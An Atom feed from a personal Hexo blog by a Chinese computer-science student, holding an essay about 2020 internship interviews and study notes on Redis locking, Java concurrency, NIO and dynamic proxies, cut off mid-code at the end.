<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cat&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://runindark.com/"/>
  <updated>2020-06-28T01:52:32.076Z</updated>
  <id>http://runindark.com/</id>
  
  <author>
    <name>夜小猫</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Mysql复习总结</title>
    <link href="http://runindark.com/2020/06/28/2020%E7%A7%8B%E6%8B%9B/mysql/"/>
    <id>http://runindark.com/2020/06/28/2020秋招/mysql/</id>
    <published>2020-06-28T01:50:52.410Z</published>
    <updated>2020-06-28T01:52:32.076Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="面试" scheme="http://runindark.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="mysql" scheme="http://runindark.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>开始也是谢幕</title>
    <link href="http://runindark.com/2020/04/26/2020%E6%98%A5%E6%8B%9B/%E5%BC%80%E5%A7%8B%E6%88%96%E8%80%85%E6%98%AF%E8%B0%A2%E5%B9%95/"/>
    <id>http://runindark.com/2020/04/26/2020春招/开始或者是谢幕/</id>
    <published>2020-04-26T15:26:33.205Z</published>
    <updated>2020-06-28T01:49:35.708Z</updated>
    
    <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""> <a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="开始也是谢幕"><a href="#开始也是谢幕" class="headerlink" title="开始也是谢幕"></a>开始也是谢幕</h2><p>感谢<strong>三太子敖丙</strong>文章《我的青春结束了》，同时也向丙哥致敬</p><h3 id="那天我决定开始"><a href="#那天我决定开始" class="headerlink" title="那天我决定开始"></a>那天我决定开始</h3><p>三月中旬，辅导员突然通知的一个蚂蚁金服内推，点亮了在疫情期间，迷茫而无措的我，也正是那一刻，心中炽热的阿里梦，瞬间滚热成一个火球，让我在灰暗的生活中捕捉到了光。<br>阿里在我的眼中，与其他人不同，在其他人眼中阿里是一个高高在上的“大厂”或者是“贴金试炼地”，对于我而言阿里是一个平凡生命中有史以来的第一个称得上梦想的东西。辅导员的通知，对于我而言，不是机会，是让我能接近梦想的奢侈品。<br>于是，顺利成章的加群，去联系群主或者是管理员，去修改简历，因为真的小白，也真的无助，只能厚着脸皮去请别人帮忙。<br>自己还算是比较机智吧，我意识到了一个两个前辈的审批是不够精准的，于是自己从牛客上疯狂去找阿里的内推，只要是阿里的，无脑去问，一次又一次，终于拿到了自己比较满意的简历，在此<strong>特别感谢阿里云某团队的老哥帮我改简历，我office都不会的操作，老哥都是半夜12点亲自帮我去改</strong>（具体名字和团队就不提了，不想打扰到老哥们的生活），也正是这一版，也是我的最终版简历，还是要表达一下谢意，真的很感谢阿里云的老哥，以及还有<strong>美团老哥的鼓励，让我勇敢的去投阿里</strong>。<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587931427458&amp;di=7f318b0a53b70e1f3001b82b0e13b630&amp;imgtype=0&amp;src=http%3A%2F%2Fimg.pconline.com.cn%2Fimages%2Fupload%2Fupc%2Ftx%2Fphotoblog%2F1506%2F01%2Fc22%2F7806181_1433168953716_mthumb.jpg" alt=""><br>之后又投递了，字节，腾讯，蘑菇街，美团等不同的企业，也开始了自己的面试经复习之路。<br>是的，没有看错，我是从投完简历才开始从0开始复习的，因为自己有做外包项目的经验，所以代码还是写过不少的，而且自己不知道行情，一直以为是等疫情结束的开学才会有的，所以一直没去复习面试经，这里确实是自己安排的不够合理。<br>阿里是梦想，那么复习是我更深去触及梦想唯一的途径，复习是残酷的，大概每天8.00起床的样子，到晚上凌晨2.30的样子，大概一周多一些，不到两周的时间，我生平的第一次面试，送给了字节跳动，字节大佬的面试，将我彻底的按在地上摩擦，摩擦，像魔鬼的步伐。。。生平第一次面试就这样交代了，那次面试我自己都面到不想继续面的程度，内心的压抑是到现在为止都害怕的，面试官的不断推进，施压，我，我更是大脑混乱，完全不知所言。面完以后整个人都是压抑的，那一次我对未来的面试都是恐惧。<br>接下来就是蘑菇街的面试了，是一个温柔的小哥哥，循序渐进的引导我，答错了也都无所谓，就是引导，让我分析问题，就这样，我一点一点的思路明晰起来，虽然感觉还是不够满意，但是确实，遇到温柔的人，内心也是温暖的，也点起了些许信心，感谢蘑菇街一面的小哥哥。</p><h3 id="拉满的皮筋，憔悴的容不得一丝丝触动"><a href="#拉满的皮筋，憔悴的容不得一丝丝触动" class="headerlink" title="拉满的皮筋，憔悴的容不得一丝丝触动"></a>拉满的皮筋，憔悴的容不得一丝丝触动</h3><p>与上面的相比，都是有所准备的去面试，阿里的突袭才是噩梦的开始，我投递了几乎阿里所有能看到的部门，现在想想太不懂事了，最后其实只能选一个，自己投了不计其数个，其实我的心思是简单的，就怕简历都过不去，所以只能海投。<br>阿里的面试，很少是预约的，几乎全是猝不及防的突袭，蚂蚁，淘系，阿里云几乎都是突袭，那些天我只要听到手机铃声，整个心都是颤抖的，我不知道大家是怎样的，尤其是直面梦想的时候，我真的很紧张。<br>我只知道自己很少停下，神经一直是紧绷的，容不得一丝丝其它触动，最夸张的是家里人有次不过是说话声音大了一点，我瞬间惊出一生冷汗，心跳不止。<br>因为自己的面试是很晚才开始去准备的，所以很害怕遇到自己不会的东西，还有一些主观对阿里的期望，造成了眼中的心里压力，那些天，我真的没能好好的睡过一觉，叫我起床的不是闹铃，是幻听到的手机铃声。</p><h3 id="朝八晚二的生活，一直持续着"><a href="#朝八晚二的生活，一直持续着" class="headerlink" title="朝八晚二的生活，一直持续着"></a>朝八晚二的生活，一直持续着</h3><p>是的，从投完简历开始，我的生活很规律，都是8点起床，一直到凌晨2点，一直学习，甚至是3点，4点都有。<br>不过好消息是，自己居然顺顺利利的进入了蘑菇街hr面，那一刻，我内心是幸福的，幻想着能和丙哥一起工作，讲真觉得自己好幸运，然后看着b站上蘑菇街实习的一天，无限的向往，可惜好景不长，很多周的等待后，内推人告诉我，我挂了，心已然是支离破碎，很多美好突然成了一抔黄土，烟消云散，后来看到蘑菇街裁员和丙哥的一些文章，我不得不也接受事实。</p><h3 id="有幸生平遇到供应链"><a href="#有幸生平遇到供应链" class="headerlink" title="有幸生平遇到供应链"></a>有幸生平遇到供应链</h3><p>我其实过了一堆的阿里的一面，具体过了多少已经不知道了，每次面完，都是当场给我结果，告诉我一面过了，很多，很多，不光是菜鸟，也有淘系和阿里云的部门，最后还有我最热爱的供应链。<br>对于我而言，第一次去找实习，真的很迷茫，但是有幸遇到了我的供应链内推人，一点一点的去指点我，告诉我复习方向，复习方法，去做思维导图，人和人的交流似乎不用很复杂，只言片语，就可以意气相投，我由衷的感谢，真的哪怕自己后来再遇到什么，都始终让心怀敬意，再后来是一面的面试官，再到后面是团队leader，对我更是醍醐灌顶，我觉得素不相识，而且我还是个双非的普通大三学生，leader愿意跟我说那么多，给我那么多耐心，真的是我无法言语的感谢。<br>尽管后来因为自己资质测试没能过关，20多天一直没有安排三面，但是自己丝毫没有怨言，从某一刻开始，我就觉得哪怕自己春招失败，失去机会，也不想去给团队填任何麻烦，所以我一直等到了内推结束的倒数五天，一直等，从未有丝毫怨言，尽管也错过了不少被捞的机会，但是在我看来单纯是那份恩情，足以让我受用很久很久，没有一点遗憾，也没有一点怨言。</p><h3 id="再然后····"><a href="#再然后····" class="headerlink" title="再然后····"></a>再然后····</h3><p>再然后是自己疯狂去找其它部门去捞，屡屡碰壁，手中0offer的我，心里突然觉得是悲凉的，巨大的灰暗席卷过来，我看到了接近一个多月的地狱般的压抑复习生活，其实毫无作用，毫无结果，当人觉得生活失望的时候，生命中将永远是阳光照不到的角落，想到自己每次面试时的准备都是可笑的，都是徒劳的，没有一丝丝结果，没有一丝丝希望，我戏虐的打量着自己，都是厌恶。<br>自己是个要强的人，我可以忍受自己不在意的方面受尽白眼，可是我无法允许自己为了梦想拼尽全力，却依然徒劳无功，我是悲哀的，是庸人，是一个loser，我心里很难过，却说不出去，因为身边的人都不懂我，更不懂我心里忍受着什么<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587931569405&amp;di=100002bcaab181437e5ac082bbc951a6&amp;imgtype=0&amp;src=http%3A%2F%2Fimg3.imgtn.bdimg.com%2Fit%2Fu%3D3250098168%2C1574921439%26fm%3D214%26gp%3D0.jpg" alt=""></p><h3 id="一个人对自己没有信心的时候，更别提什么狗屁安慰"><a href="#一个人对自己没有信心的时候，更别提什么狗屁安慰" class="headerlink" title="一个人对自己没有信心的时候，更别提什么狗屁安慰"></a>一个人对自己没有信心的时候，更别提什么狗屁安慰</h3><p>当自己厌恶自己的时候，所有的安慰，问候，无论好坏，都会觉得是对自己的嘲讽和戏虐，从失败的那一刻起，我的只能麻木的刷着短视频，然后睡觉，尽力让自己麻木，让本不宽裕的心，尽量少的去想，颓废可能早就挂满脸上。</p><h3 id="谢幕或者是开始"><a href="#谢幕或者是开始" class="headerlink" title="谢幕或者是开始"></a>谢幕或者是开始</h3><p>今天偶然把头蒙进被子的时候，看到了丙哥《我的青春结束了》，我看到丙哥自己写的，<br><img src="https://mmbiz.qpic.cn/mmbiz_jpg/uChmeeX1FpxVSphnx5RG2s8UBAj73hFdoqjibZmyhSbWRqnAvBE9SiaWnTbxkicOFoJ8f7q57ibXibNS940nSdy0ibTg/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt=""><br>看到 “莫愁前路无知己，天下谁人不识君”的时候，眼眶突然就红了，我不知道是委屈还是怎样，只是那一刻我第一次觉得鼻子真的很酸，眼睛真的很涩<br>当我静下来写这些文字的时候，我还是不知道到底是什么情感，只有这句话深深的刻在自己心上了</p><h3 id="开始也是谢幕-1"><a href="#开始也是谢幕-1" class="headerlink" title="开始也是谢幕"></a>开始也是谢幕</h3><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587931671041&amp;di=d9ffea761b485a35ef818a31789203ca&amp;imgtype=0&amp;src=http%3A%2F%2Fimg3.duitang.com%2Fuploads%2Fitem%2F201409%2F04%2F20140904113626_MSi5f.jpeg" alt=""><br>现在安静了下来，我不想抱怨什么，只是想说，生命不管是什么时候，只要还没死，一切都是过客，一切都还有希望，哪怕是一丝丝，也要去把握。<br>我曾经一个月向我的阿里梦付出一切，我将所有美好都寄托在阿里梦上面，我以为梦碎了，其实是我迷路了，而且摔了很痛的一跤，挺疼的，但梦还在那里。<br>为梦想头破血流，我无怨无悔。为一份情谊，我把自己逼入绝路，我毫无怨言。<br>我有点回忆起我高考选志愿的时候，家里人都不太支持我学计算机，我记得自己说过这么一句话，“我不想平淡无奇，一眼望到头的生活，我想苦尽甘来，生活才真的有了意义”。<br>当时的倔强，就是我现在的生活，是自己的选择，不该有怨言。<br>当自己确定一个梦想的时候，就已经把自己逼上了绝路，无法回头，你是双非，请用让自己212，986去要求自己，比211，985都多个1，不是你比名校多差，只是你需要证明自己不光不差，也更优秀，因为只有弱小的人获得力量后才能更好的去珍惜。如果你是名校，请千万把握住这份优势，别让自己后悔。</p><h3 id="有两段歌词"><a href="#有两段歌词" class="headerlink" title="有两段歌词"></a>有两段歌词</h3><p>《世间美好与你环环相扣》<br>知道你不能 还要你感受<br>让星光加了一点彩虹<br>让樱花偷偷 吻你额头<br>让世间美好 与你环环相扣</p><blockquote><p>希望逆旅者，都能得到这份抚慰</p></blockquote><p>《好像爱这个世界啊》<br>抱着沙发 睡眼昏花 凌乱头发<br>却渴望像电影一样去表达</p><p>屋檐脚下 排着乌鸦 密密麻麻<br>被压抑的情绪不知如何去表达</p><p>无论我 在这里 在那里<br>仿佛失魂的虫鸣<br>却明白此刻应该做些努力</p><blockquote><p>这就是我的手机铃声，说来碰巧，这是花花写个抑郁症患者的抚慰，那几天的我也接近崩溃，如果你心也如此，请爱这个世界</p></blockquote><h3 id="悄悄说一句"><a href="#悄悄说一句" class="headerlink" title="悄悄说一句"></a>悄悄说一句</h3><p>我联系到了其它部门可以继续捞我，也算是亡羊补牢<br>我自己也又投了很多offer，或许还有希望</p></the></excerpt>]]></content>
    
    <summary type="html">
    
      &lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;/excerpt&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·二面知识点总结》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/22/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-%E4%BA%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>http://runindark.com/2020/03/22/2020春招/我为阿里-二面知识点/</id>
    <published>2020-03-22T03:12:52.385Z</published>
    <updated>2020-06-28T01:43:26.137Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h2><blockquote><p>布隆过滤器主要是针对大量数据的一个预判，可以给出两种结果，1.一定不存在 2. 可能存在的<br>布隆过滤器使用多个映射的hash函数将一个数据直接映射到一个bit数组上，当进行插入的时候，n个映射函数的值会直接到达布隆过滤器的索引位置，并且设置树脂为1，因此如果发生hash碰撞会发生，某个数组的位置多次为1，情况，因此会得出可能存在的结论，但是如果查找的时候，n个hash函数有任意一位过滤的数组值为不为1，那么则一定不存在。</p></blockquote><h2 id="秒杀系统中为什么会产生超卖的现象？"><a href="#秒杀系统中为什么会产生超卖的现象？" class="headerlink" title="秒杀系统中为什么会产生超卖的现象？"></a>秒杀系统中为什么会产生超卖的现象？</h2><blockquote><p>由于使用mysql的时候数据库本身的存储引擎innodb是改操作是排他锁，但是读的操作是不上锁的，当到达最后一个的时候，如果都查到还剩下一个，那么其它的请求过来都会同时的更改数据库，那么就会造成超卖，也是快照读的一个弊病。</p></blockquote><h3 id="怎么解决超卖现象？"><a href="#怎么解决超卖现象？" class="headerlink" title="怎么解决超卖现象？"></a>怎么解决超卖现象？</h3><blockquote><p>最简单的思路，就是每次在sql语句中，更改的时候，在where的时候设条件大于0，但是这样子一旦超过数据库的承受能力，还是会超读<br>每次的读操作都上排他锁，这样子可以避免这个现象，但是会导致性能大幅度降低<br>使用redis是最好的方法，可以把要秒杀的内容放到redis的队列中，使用一次则删除一次</p></blockquote><h4 id="细致深入：Redis实现秒杀系统"><a href="#细致深入：Redis实现秒杀系统" class="headerlink" title="细致深入：Redis实现秒杀系统"></a>细致深入：Redis实现秒杀系统</h4><blockquote><p>核心redis的操作命令，sextnx（细粒度上锁） + expire（强制锁释放）</p><ol><li>首先需要将秒杀的数据放到一个redis中，然后在操作redis的时候可以用setnx去操作数据，所谓细粒度锁是一个抽象概念，sexnx就是具体实现（其实更加直白的理解一些，普通的get/put是一个原子操作,但是一系列操作就不再是原子性的了，setnx是一个原子操作，所以可以作为一个细粒度锁）</li><li>更加直接的来，就是将数据都加入到redis的list中，然后使用Lpop命令不断获取就ok（移除并返回列表的第一个元素）</li></ol></blockquote><h2 id="Redis深入"><a href="#Redis深入" class="headerlink" title="Redis深入"></a>Redis深入</h2><h3 id="redis能用的的加锁命令分表是INCR、SETNX、SET"><a href="#redis能用的的加锁命令分表是INCR、SETNX、SET" class="headerlink" title="redis能用的的加锁命令分表是INCR、SETNX、SET"></a>redis能用的的加锁命令分表是INCR、SETNX、SET</h3><blockquote><p>redis所有的单独的命令都是原子的</p></blockquote><h4 id="INCR"><a href="#INCR" class="headerlink" title="INCR"></a>INCR</h4><blockquote><p>这种加锁的思路是， key 不存在，那么 key 的值会先被初始化为 0 ，然后再执行 INCR 操作进行加一。然后其它用户在执行 INCR 操作进行加一时，如果返回的数大于 1 ，说明这个锁正在被使用当中。</p></blockquote><h4 id="SETNX"><a href="#SETNX" class="headerlink" title="SETNX"></a>SETNX</h4><blockquote><p>这种加锁的思路是，如果 key 不存在，将 key 设置为 value如果 key 已存在，则 SETNX 不做任何动作</p></blockquote><h4 id="SET"><a href="#SET" class="headerlink" title="SET"></a>SET</h4><blockquote><p>借助 Expire 来设置就不是原子性操作了。所以还可以通过事务来确保原子性，但是还是有些问题，所以官方就引用了另外一个，使用 SET 命令本身已经从版本 2.6.12 开始包含了设置过期时间的功能</p></blockquote><h4 id="上锁可能出现的问题"><a href="#上锁可能出现的问题" class="headerlink" title="上锁可能出现的问题"></a>上锁可能出现的问题</h4><h5 id="1、-redis发现锁失败了要怎么办？中断请求还是循环请求？"><a href="#1、-redis发现锁失败了要怎么办？中断请求还是循环请求？" class="headerlink" title="1、 redis发现锁失败了要怎么办？中断请求还是循环请求？"></a>1、 redis发现锁失败了要怎么办？中断请求还是循环请求？</h5><blockquote><p>可以利用循环进行重复请求</p></blockquote><h5 id="2、-循环请求的话，如果有一个获取了锁，其它的在去获取锁的时候，是不是容易发生抢锁的可能？"><a href="#2、-循环请求的话，如果有一个获取了锁，其它的在去获取锁的时候，是不是容易发生抢锁的可能？" class="headerlink" title="2、 循环请求的话，如果有一个获取了锁，其它的在去获取锁的时候，是不是容易发生抢锁的可能？"></a>2、 循环请求的话，如果有一个获取了锁，其它的在去获取锁的时候，是不是容易发生抢锁的可能？</h5><blockquote><p>循环的时候可以sleep一下</p></blockquote><h5 id="3、-锁提前过期后，客户端A还没执行完，然后客户端B获取到了锁，这时候客户端A执行完了，会不会在删锁的时候把B的锁给删掉？"><a href="#3、-锁提前过期后，客户端A还没执行完，然后客户端B获取到了锁，这时候客户端A执行完了，会不会在删锁的时候把B的锁给删掉？" class="headerlink" title="3、 锁提前过期后，客户端A还没执行完，然后客户端B获取到了锁，这时候客户端A执行完了，会不会在删锁的时候把B的锁给删掉？"></a>3、 锁提前过期后，客户端A还没执行完，然后客户端B获取到了锁，这时候客户端A执行完了，会不会在删锁的时候把B的锁给删掉？</h5><blockquote><p>不一定，可以借助key-value的value进行判断</p></blockquote><h5 id="锁续约问题"><a href="#锁续约问题" class="headerlink" title="锁续约问题"></a>锁续约问题</h5><blockquote><p><strong>Redission</strong><br>当成功的获取一个锁的时候，就会产生一个 watch dog 进行锁续期，每10秒去检查一次，然后重置成设定的过期时间<br>加锁机制是lua脚本<br>解锁过程就比较简单了，如果是程序计数器则继续进行-1，直到等于0，然后删除该key即可（unlock操作）</p></blockquote><h5 id="Lua原子性"><a href="#Lua原子性" class="headerlink" title="Lua原子性"></a>Lua原子性</h5><blockquote><p>Redis 使用单个 Lua 解释器去运行所有脚本，并且， Redis 也保证脚本会以原子性(atomic)的方式执行： 当某个脚本正在运行的时候，不会有其他脚本或 Redis 命令被执行。 这和使用 MULTI / EXEC 包围的事务很类似。 在其他别的客户端看来，脚本的效果(effect)要么是不可见的(not visible)，要么就是已完成的(already completed)</p></blockquote><h2 id="了解java内存模型吗，JVM整体和并发的一些关系"><a href="#了解java内存模型吗，JVM整体和并发的一些关系" class="headerlink" title="了解java内存模型吗，JVM整体和并发的一些关系"></a>了解java内存模型吗，JVM整体和并发的一些关系</h2><blockquote><p>Java内存模型就是定义程序中变量（静态变量、数组对象元素等，不包括局部变量、方法参数）的访问规则</p></blockquote><h3 id="内存模型操作的八个指令"><a href="#内存模型操作的八个指令" class="headerlink" title="内存模型操作的八个指令"></a>内存模型操作的八个指令</h3><p><a href="https://www.cnblogs.com/zzq6032010/p/10328399.html" target="_blank" rel="noopener">博客原文</a></p><ul><li><p>lock：作用于主内存变量，将该变量标识为一个线程独占的状态</p></li><li><p>unlock：作用于主内存变量，将独占状态释放</p></li><li><p>read：作用于主内存变量，将值拷贝到工作内存中</p></li><li><p>load：作用于工作内存中的变量，将值放到工作内存中的变量副本中</p></li><li><p>use：作用于工作内存中的变量，将值传给执行引擎</p></li><li><p>asign：作用于工作内存中的变量，将执行引擎中的值赋给工作内存中的变量</p></li><li><p>store：作用于工作内存中的变量，将值传给主内存</p></li><li><p>write：作用于主内存中的变量，将工作内存中返回的值放到主内存变量中</p><h3 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h3><blockquote><p>保证load与use必须相邻调用，即要use这个变量，必定先执行read/load，这样每次都能获取到最新的变量值；它又保证asign与store必须相邻调用，即在工作内存中将该变量改了之后，必定会先同步到主内存中</p></blockquote></li></ul><h2 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h2><h3 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h3><blockquote><p>是一个双向的链表，概念上的队列，但不是真正的实现也是队列</p></blockquote><h3 id="条件队列"><a href="#条件队列" class="headerlink" title="条件队列"></a>条件队列</h3><blockquote><p>是根据condition创建出来的队列，上锁后可以负责对线程的监视，比synchronized的监视器更加灵活，是一个单向的链表，当唤醒界节点的时候会直接添加到阻塞队列中</p></blockquote><h3 id="Node节点"><a href="#Node节点" class="headerlink" title="Node节点"></a>Node节点</h3><h4 id="1-waitstatus"><a href="#1-waitstatus" class="headerlink" title="1. waitstatus"></a>1. waitstatus</h4><ol><li><p>CANCELLED：值为1，在同步队列中等待的线程等待超时或被中断，需要从同步队列中取消该Node的结点，其结点的waitStatus为CANCELLED，即结束状态，进入该状态后的结点将不会再变化。</p></li><li><p>SIGNAL：值为-1，被标识为该等待唤醒状态的后继结点，当其前继结点的线程释放了同步锁或被取消，将会通知该后继结点的线程执行。说白了，就是处于唤醒状态，只要前继结点释放锁，就会通知标识为SIGNAL状态的后继结点的线程执行。</p></li><li><p>CONDITION：值为-2，与Condition相关，该标识的结点处于等待队列中，结点的线程等待在Condition上，当其他线程调用了Condition的signal()方法后，CONDITION状态的结点将从等待队列转移到同步队列中，等待获取同步锁。</p></li><li><p>PROPAGATE：值为-3，与共享模式相关，在共享模式中，该状态标识结点的线程处于可运行状态</p><h4 id="2-prev"><a href="#2-prev" class="headerlink" title="2. prev"></a>2. prev</h4><blockquote><p>前驱节点</p></blockquote><h4 id="3-next"><a href="#3-next" class="headerlink" title="3. next"></a>3. next</h4><blockquote><p>后继节点</p></blockquote><h4 id="4-thread"><a href="#4-thread" class="headerlink" title="4. thread"></a>4. thread</h4><blockquote><p>thread 同步线程队列主要存储的线程信息。</p></blockquote><h4 id="5-nextwaiter"><a href="#5-nextwaiter" class="headerlink" title="5. nextwaiter"></a>5. nextwaiter</h4><p>AQS中阻塞队列采用的是用双向链表保存，用prve和next相互链接。而AQS中条件队列是使用单向列表保存的，用<br>nextWaiter来连接。阻塞队列和条件队列并不是使用的相同的数据结构</p></li></ol><p><a href="https://segmentfault.com/a/1190000015804888" target="_blank" rel="noopener">精髓原帖</a></p><p>在Node节点的源码中有两个常量属性</p><pre><code class="java"><span class="comment">// 共享模式</span><span class="keyword">static</span> <span class="keyword">final</span> Node SHARED = <span class="keyword">new</span> Node();<span class="comment">// 独占模式</span><span class="keyword">static</span> <span class="keyword">final</span> Node EXCLUSIVE = <span class="keyword">null</span>;<span class="comment">// 其他模式</span><span class="comment">// 其他非空值：条件等待节点（调用Condition的await方法的时候）</span></code></pre><h2 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h2><blockquote><p>Channel(通道)，Buffer(缓冲区), Selector</p></blockquote><h3 id="Channel"><a href="#Channel" class="headerlink" title="Channel"></a>Channel</h3><blockquote><p>通道是双向的，通过一个Channel既可以进行读，也可以进行写</p></blockquote><h3 id="Buffer"><a href="#Buffer" class="headerlink" title="Buffer"></a>Buffer</h3><ul><li><p>capacity:缓冲区数组的总长度</p></li><li><p>position:下一个要操作的数据元素的位置</p></li><li><p>limit:缓冲区数组中不可操作的下一个元素的位置：limit&lt;=capacity</p></li><li><p>mark:用于记录当前position的前一个位置或者默认是-1</p></li></ul><h3 id="Selector"><a href="#Selector" class="headerlink" title="Selector"></a>Selector</h3><blockquote><p>Selector类是NIO的核心类，Selector能够检测多个注册的通道上是否有事件发生，如果有事件发生，便获取事件然后针对每个事件进行相应的响应处理</p></blockquote><h2 id="http-和-https"><a href="#http-和-https" class="headerlink" title="http 和 https"></a>http 和 https</h2><p>HTTPS和HTTP的主要区别</p><ul><li><p>https协议需要到CA申请证书，一般免费证书较少，因而需要一定费用。</p></li><li><p>http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl/tls加密传输协议。</p></li><li><p>http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</p></li><li><p>http的连接很简单，是无状态的；HTTPS协议是由SSL/TLS+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全</p></li></ul></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·蘑菇街总结》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/18/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-%E8%98%91%E8%8F%87%E8%A1%97%E6%80%BB%E7%BB%93/"/>
    <id>http://runindark.com/2020/03/18/2020春招/我为阿里-蘑菇街总结/</id>
    <published>2020-03-18T14:23:17.382Z</published>
    <updated>2020-06-28T01:43:26.137Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>2020-03-18 蘑菇街一面 是凉凉了 但是很高兴的是面试官真的很耐心 自己也发现了很多的问题和不足<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><h4 id="动态代理的两种方法"><a href="#动态代理的两种方法" class="headerlink" title="动态代理的两种方法"></a>动态代理的两种方法</h4><h5 id="Proxy-InvocationHandler"><a href="#Proxy-InvocationHandler" class="headerlink" title="Proxy + InvocationHandler"></a>Proxy + InvocationHandler</h5><p>被代理对象接口<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(User user)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>被代理类接口实现<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"add user into database."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setId(id);</span><br><span class="line">        System.out.println(<span class="string">"getUser from database."</span>);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>代理（中间）类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyUtil</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;    <span class="comment">// 被代理的对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"do sth before...."</span>);</span><br><span class="line">        Object result =  method.invoke(target, args);</span><br><span class="line">        System.out.println(<span class="string">"do sth after...."</span>);</span><br><span 